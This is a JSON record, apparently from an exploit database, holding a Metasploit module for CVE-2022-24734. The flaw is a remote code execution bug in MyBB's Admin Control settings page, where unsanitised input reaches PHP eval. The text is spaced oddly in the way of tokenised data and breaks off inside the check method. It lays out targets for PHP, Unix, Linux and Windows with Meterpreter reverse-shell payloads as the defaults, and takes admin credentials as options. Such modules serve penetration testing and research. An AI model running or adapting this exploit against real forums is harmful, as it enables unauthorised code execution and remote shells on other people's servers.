{
    "text": "vul_name : MyBB Admin Control Remote Code Execution ， vul_cve : CVE-2022-24734 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Powershell ， include Msf : Exploit : CmdStager ， super (  ， update_info (  ， info ,  ， 'Name' => 'MyBB Admin Control Code Injection RCE' ,  ， 'Description' => %q{ ， This exploit module leverages an improper input validation ， vulnerability in MyBB prior to `1.8.30` to execute arbitrary code in ， the context of the user running the application. ， MyBB Admin Control setting page calls PHP `eval` function with an ， unsanitized user input. The exploit adds a new setting , injecting the ， payload in the vulnerable field , and triggers its execution with a ， second request. Finally , it takes care of cleaning up and removes the ， setting. ， Note that authentication is required for this exploit to work and the ， account must have rights to add or update settings ( typically , myBB ， administrator role ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Cillian Collins' ,  # vulnerability research ， 'Altelus' ,  # original PoC ， 'Christophe De La Fuente' # MSF module ，  ]  ,  ， ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'CVE' , '2022-24734' ]  ，  ]  ,  ， 'Platform' => %w [ php unix linux win ]  ,  ， 'Privileged' => false ,  ， 'Arch' => [ ARCH_PHP , ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Targets' => [  ，  [  ， 'PHP' ,  ， { ， 'Platform' => 'php' ,  ， 'Arch' => ARCH_PHP ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' } ,  ， 'Type' => : in_memory ， } ，  ]  ,  ，  [  ， 'Unix ( In-Memory ) ' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_php_ssl' } ,  ， 'Type' => : in_memory ， } ，  ]  ,  ，  [  ， 'Linux ( Dropper ) ' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' } ,  ， 'Type' => : dropper ， } ，  ]  ,  ，  [  ， 'Windows ( In-Memory ) ' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp' } ,  ， 'Type' => : in_memory ， } ，  ]  ,  ，  [  ， 'Windows ( Dropper ) ' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' } ,  ， 'Type' => : dropper ， } ，  ]  ，  ]  ,  ， 'DisclosureDate' => '2022-03-09' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ CONFIG_CHANGES , ARTIFACTS_ON_DISK ]  ， } ， register_options (  ，  [  ， OptString.new ( 'USERNAME' ,  [ true , 'MyBB Admin CP username' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'MyBB Admin CP password' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The URI of the MyBB application' , '/' ]  )  ，  ]  ， end ， def check ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'index.php' )  ,  ， 'method' => 'GET' ,  ， 'vars_get' => { 'intcheck' => 1 } ， } ) ",
    "time": "2022.05.31"
}